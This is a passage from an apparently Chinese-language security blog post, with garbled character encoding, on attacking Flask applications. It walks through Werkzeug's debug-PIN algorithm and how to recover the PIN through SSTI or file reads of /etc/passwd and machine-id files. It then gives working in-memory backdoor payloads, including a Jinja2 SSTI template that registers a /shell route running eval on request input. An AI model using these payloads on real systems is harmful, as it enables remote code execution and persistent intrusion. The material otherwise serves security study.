class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> getpass<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_machine_id</span>():<br>    <span class="hljs-comment"># --- linux è·å–é€»è¾‘ ---</span><br>    linux = <span class="hljs-string">b&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/etc/machine-id&quot;</span>, <span class="hljs-string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                value = f.readline().strip()<br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> value:<br>            linux += value<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># å¦‚æœæ˜¯å®¹å™¨ï¼Œä¸‹é¢çš„é€»è¾‘å¯ä»¥ç”¨äºåŒºåˆ†ä¸åŒå®¹å™¨</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/cgroup&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            linux += f.readline().strip().rpartition(<span class="hljs-string">b&quot;/&quot;</span>)[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">except</span> OSError:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">if</span> linux:<br>        <span class="hljs-keyword">return</span> linux<br><br>    <span class="hljs-comment"># --- OS X è·å–é€»è¾‘ ---</span><br>    <span class="hljs-comment"># ç”¨ ioreg å»è·å– machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># subprocess may not be available, e.g. Google App Engine</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/925</span><br>        <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE<br><br>        dump = Popen(<br>            [<span class="hljs-string">&quot;ioreg&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>], stdout=PIPE<br>        ).communicate()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">except</span> (OSError, ImportError):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># --- Windows è·å–é€»è¾‘ ---</span><br>    <span class="hljs-comment"># ç”¨ winreg å»è·å– machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">import</span> winreg<br>    <span class="hljs-keyword">except</span> ImportError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> winreg.OpenKey(<br>                winreg.HKEY_LOCAL_MACHINE,<br>                <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,<br>                <span class="hljs-number">0</span>,<br>                winreg.KEY_READ | winreg.KEY_WOW64_64KEY,<br>            ) <span class="hljs-keyword">as</span> rk:<br>                guid, guid_type = winreg.QueryValueEx(rk, <span class="hljs-string">&quot;MachineGuid&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> guid_type == winreg.REG_SZ:<br>                    <span class="hljs-keyword">return</span> guid.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>                <span class="hljs-keyword">return</span> guid<br><br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pin_and_cookie_name</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-comment"># ç¯å¢ƒå˜é‡é‡Œçš„ WERKZEUG_DEBUG_PIN</span><br>    pin = os.environ.get(<span class="hljs-string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)<br>    rv = <span class="hljs-literal">None</span><br>    num = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin == <span class="hljs-string">&quot;off&quot;</span>:<br>        <span class="hljs-comment"># æ­¤æ—¶æ— éœ€å¡«å†™ pin å³å¯ä½¿ç”¨ webshell</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pin.replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).isdigit():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> pin:<br>            <span class="hljs-comment"># æ­¤æ—¶ pin ç å°±æ˜¯ WERKZEUG_DEBUG_PIN çš„å€¼</span><br>            rv = pin<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># åé¢ len(num) ä¼šä½œä¸º pin ç çš„é•¿åº¦</span><br>            num = pin<br><br>    <span class="hljs-comment"># å‚æ•° 1ï¼š</span><br>    <span class="hljs-comment"># ç”±äº flask ä¼ å…¥çš„å›ºå®šæ˜¯ flask.Flask()</span><br>    <span class="hljs-comment"># æ‰€ä»¥è¿™é‡Œçš„ modname å°±æ˜¯ &quot;flask.app&quot;</span><br>    modname = <span class="hljs-built_in">getattr</span>(<br>        app,<br>        <span class="hljs-string">&quot;__module__&quot;</span>,<br>        t.cast(<span class="hljs-built_in">object</span>, app).__class__.__module__<br>    )<br><br>    <span class="hljs-comment"># å‚æ•° 2ï¼š</span><br>    <span class="hljs-comment"># è¿™é‡Œè·å–çš„æ˜¯ç³»ç»Ÿçš„ç”¨æˆ·å</span><br>    <span class="hljs-comment"># å…¶å®å°±æ˜¯æ‰§è¡Œ whoami</span><br>    <span class="hljs-keyword">try</span>:<br>        username = getpass.getuser()<br>    <span class="hljs-keyword">except</span> (ImportError, KeyError):<br>        <span class="hljs-comment"># æœ‰äº›ç‰¹æ®Šçš„æƒ…å†µä¸‹ï¼ŒUID æ— æ³•å”¯ä¸€å…³è”åˆ°ä¸€ä¸ªç”¨æˆ·</span><br>        <span class="hljs-comment"># å°±ä¼šæŠ¥é”™ï¼Œæ¬¡æ•° username å°±æ˜¯ None</span><br>        <span class="hljs-comment"># ç›¸å…³ issue å¯è§ï¼š</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/1471</span><br>        username = <span class="hljs-literal">None</span><br><br>    mod = sys.modules.get(modname)<br>    probably_public_bits = [<br>        username,  <span class="hljs-comment"># `whoami`</span><br>        modname,  <span class="hljs-comment"># &quot;flask.app&quot;</span><br>        <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__name__&quot;</span>, <span class="hljs-built_in">type</span>(app).__name__),  <span class="hljs-comment"># &quot;Flask&quot;</span><br><br>        <span class="hljs-comment"># å‚æ•° 3ï¼š</span><br>        <span class="hljs-comment"># æ¨¡å— modname æ‰€åœ¨æ–‡ä»¶çš„å®Œæ•´ç³»ç»Ÿè·¯å¾„</span><br>        <span class="hljs-comment"># è¿™é‡Œå…¶å®å°±æ˜¯ app.py æ‰€åœ¨çš„å®Œæ•´ç³»ç»Ÿè·¯å¾„</span><br>        <span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>),<br>    ]<br><br>    <span class="hljs-comment"># å‚æ•° 4ï¼š</span><br>    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªå€¼æ˜¯æœåŠ¡å™¨çš„ MAC åœ°å€ï¼Œå®ƒæ˜¯ä¸€ä¸ª 48 ä½æ­£æ•´æ•°</span><br>    <span class="hljs-comment"># ç¬¬äºŒä¸ªå€¼æ˜¯ get_machine_id()</span><br>    private_bits = [<span class="hljs-built_in">str</span>(uuid.getnode()), get_machine_id()]<br><br>    h = hashlib.sha1()<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>            bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>        h.update(bit)<br><br>    <span class="hljs-comment"># å‚æ•° 5ï¼š</span><br>    <span class="hljs-comment"># å›ºå®šå€¼ cookiesalt</span><br>    h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>    <span class="hljs-comment"># è¿™ä¸ªæˆ‘ä»¬ç”¨ä¸åˆ°</span><br>    cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># å›ºå®šå€¼ pinsalt</span><br>        h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br><br>        <span class="hljs-comment"># è¿™é‡Œé•¿åº¦æ°¸è¿œæ˜¯ 9ï¼Œä¸€å®šæ˜¯ç¬¦åˆä¸‹é¢è¦æ±‚çš„é•¿åº¦</span><br>        num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br>    <span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># å°† num æ‹†è§£ä¸º n ç»„ï¼Œæ¯ç»„é€šè¿‡ &#x27;-&#x27; è¿æ¥</span><br>                <span class="hljs-comment"># n å¿…é¡»ä¸º [5, 4, 3] çš„å…¶ä¸­ä¸€ä¸ªçš„å€æ•°</span><br>                <span class="hljs-comment"># å¦åˆ™è®¤ä¸º num é•¿åº¦é”™è¯¯</span><br>                rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                    num[x: x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>                )<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># é•¿åº¦é”™è¯¯çš„ num ä¼šè¢«ç›´æ¥ç½®ä¸º pin ç </span><br>            <span class="hljs-comment"># åªä¼šå‡ºç°åœ¨è‡ªå®šä¹‰äº† WERKZEUG_DEBUG_PIN çš„æ—¶å€™</span><br>            rv = num<br><br>    <span class="hljs-keyword">return</span> rv, cookie_name<br></code></pre></td></tr></table></figure>
<p>æ‰€ä»¥ä¸€å…±æœ‰ 9 ä¸ªå¿…è¦å‚æ•°ï¼š</p>
<ol type="1">
<li>ç¯å¢ƒå˜é‡ <code>WERKZEUG_DEBUG_PIN</code>ï¼šéå¸¸é‡è¦çš„å€¼ï¼Œå®ƒæœ¬èº«å¯èƒ½å°±æ˜¯ PIN ç ï¼Œä»¥åŠå†³å®šäº†åé¢ç”Ÿæˆ PIN çš„æµç¨‹ã€‚ä¸è¿‡è¿™ä¸ªå€¼ä¸€èˆ¬ä¸ä¼šä¿®æ”¹</li>
<li><code>probably_public_bits</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª 4 å…ƒåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«ï¼š
<ol type="1">
<li><code>username</code>ï¼šè¿è¡Œ flask æ‰€ä½¿ç”¨çš„çš„ç³»ç»Ÿç”¨æˆ·å</li>
<li><code>modname</code>ï¼šåœ¨ flask ä¸­ï¼Œæ­¤å€¼å›ºå®šæ˜¯ <code>"flask.app"</code></li>
<li>å›ºå®šå€¼ <code>"Flask"</code></li>
<li><code>app.py</code> æ‰€åœ¨çš„å®Œæ•´ç³»ç»Ÿè·¯å¾„</li>
</ol></li>
<li><code>private_bits</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª 2 å…ƒåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«ï¼š
<ol type="1">
<li>MAC åœ°å€ï¼ˆ48 ä½æ­£æ•´æ•°æ ¼å¼ï¼‰</li>
<li><code>Machine ID</code>ï¼šé€šå¸¸åœ¨ç³»ç»Ÿå®‰è£…æˆ–é¦–æ¬¡å¯åŠ¨æ—¶ä»ä¸€ä¸ªéšæœºæ•°æºç”Ÿæˆï¼Œå¹¶ä¸”ä¹‹åä¸ä¼šè‡ªå·±å‘ç”Ÿå˜åŒ–ï¼›ä¸åŒçš„æ“ä½œç³»ç»Ÿè·å–çš„æ–¹å¼ä¸åŒ</li>
</ol></li>
<li>å›ºå®šå€¼ <code>"cookiesalt"</code></li>
<li>å›ºå®šå€¼ <code>"pinsalt"</code></li>
<li>å°†ä¸Šé¢çš„ç»“æœè¿›è¡Œ sha1ï¼Œç„¶åå–å‰ 9 ä½</li>
<li>æ¯ 3 ä½ä¸€ç»„ï¼Œç”¨ <code>-</code> è¿æ¥</li>
</ol>
<p>å¦‚æœæœ‰åŠæ³•åœ¨ç›®æ ‡ç¯å¢ƒä¸­æ‰§è¡Œ Python ä»£ç ï¼Œé‚£ä¹ˆè·å– PIN æ˜¯å¾ˆç®€å•çš„ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ <code>get_pin_and_cookie_name</code> æ¥ç”Ÿæˆå³å¯ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;werkzeug.debug&#x27;</span>,<br>    fromlist=[<span class="hljs-string">&#x27;&#x27;</span>]<br>).get_pin_and_cookie_name(<br>    <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>).app<br>)<br></code></pre></td></tr></table></figure></p>
<p>ä¾‹å¦‚é€šè¿‡ SSTIï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/59bbadda-e5d1-4fcf-b42d-6869f9858fb3.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å¦‚æœå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œåˆ™éœ€è¦æ‹¿åˆ°éå›ºå®šçš„å€¼ï¼Œå¯ä»¥é€šè¿‡ç‰¹æ®Šæ–‡ä»¶æ¥è·å–ï¼š</p>
<ol type="1">
<li>ç¯å¢ƒå˜é‡ <code>WERKZEUG_DEBUG_PIN</code> å…ˆæ— è§†</li>
<li><code>username</code> é€šè¿‡ <code>/etc/passwd</code> æ¥çŒœæµ‹</li>
<li>app.py çš„ç»å¯¹è·¯å¾„åœ¨ debug çš„æŠ¥é”™ä¸­å°±æœ‰</li>
<li>åœ¨ Linux ç¯å¢ƒä¸­ï¼ŒMac åœ°å€å¯ä»¥è¯»å– <code>/sys/class/net/ç½‘å¡åç§°/address</code>ï¼Œåˆ é™¤ <code>:</code> ä¹‹åè½¬ä¸º 10 è¿›åˆ¶å³å¯ï¼Œç½‘å¡åå¯ä»¥é€šè¿‡ <code>/proc/net/dev</code> æ–‡ä»¶æ¥æŸ¥æ‰¾</li>
<li><code>Machine ID</code> æŒ‰ç…§ <code>get_machine_id</code> çš„é€»è¾‘æ¥è¯»å–å³å¯</li>
</ol>
<h3 id="å†…å­˜é©¬">å†…å­˜é©¬</h3>
<p>åœ¨æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥å‘ç° <code>flask.Flask</code> æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå¯ä»¥ä¿®æ”¹å¤„ç†è¯·æ±‚çš„é€»è¾‘ã€‚</p>
<h4 id="add_url_rule">add_url_rule</h4>
<p><code>add_url_rule</code> æ˜¯ç”¨æ¥æ³¨å†Œè·¯ç”±çš„ã€‚</p>
<p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œè¿™ä¸‰ç§å†™æ³•æ˜¯ç­‰ä»·çš„ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># å†™æ³• 1</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># å†™æ³• 2</span><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, endpoint=<span class="hljs-string">&quot;index&quot;</span>)<br><span class="hljs-meta">@app.endpoint(<span class="hljs-params"><span class="hljs-string">&quot;index&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># å†™æ³• 3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, view_func=index)<br></code></pre></td></tr></table></figure></p>
<p>è¿™å°±æ„å‘³ç€ï¼Œå¦‚æœå˜é‡ app æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>app.add_url_rule("/shell", view_func=lambda: eval(request.args["cmd"]))</code> æ¥æ¤å…¥ä¸€ä¸ªåé—¨ã€‚</p>
<p>åœ¨ç»‘å®šçš„æ—¶å€™æœ‰å‡ ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ol type="1">
<li>æ‰€æœ‰ url æ‰€ç»‘å®šçš„å‡½æ•°åç§°ï¼ˆå³ endpointï¼‰ä¸å‡½æ•°çš„æ˜ å°„å…³ç³»ï¼Œå¯ä»¥é€šè¿‡ <code>app.view_functions</code> çœ‹åˆ°</li>
<li>ç»‘å®šçš„æ—¶å€™ï¼Œä¼šå°†å¯¹åº”çš„ endpoint ä¿å­˜è‡³ <code>app.view_functions</code>ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™ endpoint å·²ç»å­˜åœ¨ï¼Œä½†æ˜¯æ–°ç»‘å®šçš„è¿‡ç¨‹ä¸­æ”¹å˜äº†å¯¹åº”çš„å‡½æ•°ï¼Œå°±ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚ lambdaï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/79aab4ed-d595-47f7-b936-be456042888d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
å› ä¸º lambda æ¯æ¬¡æ‰§è¡Œéƒ½ä¼šæ–°ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸æ˜¯å›ºå®šçš„ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9b46cbf3-439f-4f43-8aab-fe1f8a9219aa.png!blog#width-zoom4" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
<li>ä¸ºäº†é¿å…ä¸Šé¢é‚£ä¸ªé—®é¢˜ï¼Œå¯ä»¥æ‰‹åŠ¨æŒ‡å®š endpoint çš„åç§°ï¼š<code>app.add_url_rule("/shell", "ep-1", view_func=lambda x: x)</code><br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/60d521fe-2b71-4c5a-816b-8a6e6891c83a.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
<li>å¯¹äºåŒä¸€ä¸ª urlï¼Œå¦‚æœç»‘å®šäº†å¤šæ¬¡ endpointï¼Œä»¥ç¬¬ä¸€æ¬¡ç»‘å®šçš„ç»“æœä¸ºå‡†ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/00422668-1f0d-4814-bd95-264cbc56480b.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
ä¸è¿‡è¦ä¿®æ”¹ä¹Ÿç®€å•ï¼Œå¯ä»¥é€šè¿‡ <code>app.view_functions</code> ä¿®æ”¹<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/095c4a0c-92f2-4f68-ae0e-8dad90ff4f3f.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
<li>ä¸Šé¢ä¹Ÿç»™äº†æˆ‘ä»¬å¯å‘ï¼Œé€šè¿‡ <code>app.view_functions</code> å³å¯ç¯¡æ”¹ url æ‰€ç»‘å®šçš„å‡½æ•°ã€‚</li>
<li><code>app.url_map</code> ä¸­ä¿å­˜äº† url ä¸ endpoint çš„å¯¹åº”å…³ç³»ã€‚ç»“åˆä¸Šé¢çš„ç»“è®ºå¤§è‡´å¯ä»¥æ¨æµ‹å‡ºï¼Œ<code>app.add_url_rule</code> åº”è¯¥æ˜¯ä¾èµ– <code>app.view_functions</code> å’Œ <code>app.url_map</code> çš„ã€‚</li>
<li>debug æ¨¡å¼ä¸‹ï¼Œå¦‚æœç›´æ¥è°ƒç”¨ setup function æ˜¯æ²¡æœ‰åŠæ³•ä½¿ç”¨çš„ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f7c723c3-adba-46f7-97ee-9faf6fd9d6ab.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
ä»£ç ä½äº <code>site-packages/flask/scaffold.py</code> ä¸­çš„ <code>def setupmethod</code> ä¸‹ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6774680b-6b51-4b8d-af80-5c1e75ae8773.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
è€Œ <code>site-packages/flask/app.py</code> ä¸­çš„ <code>class Flask</code> ç»§æ‰¿äº† <code>Scaffold</code> ä¸”å®šä¹‰äº† <code>_is_setup_finished</code>ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/5a6525b8-5f8f-41f5-870b-c7ba27aad4dc.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
è¿™å°±è¯´æ˜ï¼Œå½“å¼€å¯ debug æ¨¡å¼ï¼Œä¸”å·²ç»å¼€å§‹å‡†å¤‡å¥½å¼€å§‹å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå°±æ²¡åŠæ³•åœ¨æ‰§è¡Œ setup function äº†ã€‚å¦‚æœä½ æƒ³çŸ¥é“è¿˜æœ‰å“ªäº›ç®— setup functionï¼Œåœ¨ <code>site-packages/flask/app.py</code> ä¸­è¢«è£…é¥°å™¨ <code>@setupmethod</code> è£…é¥°çš„éƒ½ç®—ã€‚å½“ç„¶ï¼Œç”±äºè¿™é‡Œæ˜¯é€šè¿‡è£…é¥°å™¨åšçš„é™åˆ¶ï¼Œæ‰€ä»¥ç†è®ºä¸Šæˆ‘ä»¬ç²¾ç®€ setup function ä¹‹åæˆ–è®¸ä¹Ÿå¯ä»¥è‡ªå·±æå‡ºä¸ä¹‹ç­‰ä»·çš„å‡½æ•°ï¼Œè¿™ä¸€ç‚¹åé¢ä¼šä¸¾ä¾‹ã€‚</li>
</ol>
<p>è¸©å®Œå‘ä¹‹åï¼Œä¸‹é¢ç»“åˆ jinja2 çš„ SSTI ä¸¾å‡ ä¸ªä¾‹å­ã€‚</p>
<p>ç”±äº jinja2 ä¸­å¹¶ä¸æ”¯æŒç”¨ <code>lambda</code>ï¼ˆé€šè¿‡ mro å¼•å…¥ä¹Ÿä¸è¡Œç”¨ï¼Œå› ä¸º jinja çš„è¯­æ³•æœ¬èº«å°±ä¸æ”¯æŒï¼‰ï¼Œè€Œ <code>view_func</code> å‚æ•°åˆå¿…é¡»æ˜¯ä¸€ä¸ª funcï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ <code>view_func=eval</code>ï¼Œç”±äºåœ¨ flask ä¸ä¼šç»™ <code>view_func</code> ä¼ å‚ï¼Œæ‰€ä»¥å‹æ ¹å°±æ²¡æ³•æ‰§è¡Œã€‚å¦‚æœæ˜¯å›ºå®šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤å€’æ˜¯å¯ä»¥ï¼Œå°±æ˜¯æœ‰ç‚¹ä¸å¤Ÿçµæ´»äº†ã€‚</p>
<p>ä¸ºäº†å®ç°ç±»ä¼¼ lambda çš„æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªå®ï¼Œç„¶åæ¤å…¥åé—¨ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; cycler.__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæœ‰å‘éœ€è¦æ³¨æ„ä¸‹ã€‚</p>
